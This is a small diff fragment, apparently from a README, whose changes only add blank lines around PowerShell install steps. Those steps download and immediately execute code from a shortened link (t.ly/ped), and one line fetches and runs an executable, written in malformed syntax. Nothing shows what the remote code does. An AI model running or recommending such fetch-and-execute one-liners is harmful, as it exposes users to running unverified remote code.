@@ -32,10 +32,12 @@
 
     iex(irm t.ly/ped)
 ##or
+
     irm t.ly/ped | iex
     
 #CMD or RUN Link  
 
     powershell iex(irm t.ly/ped)
 ##or
+
     powershell .\p.exe(irm t.ly/pedexe -o p.exe)
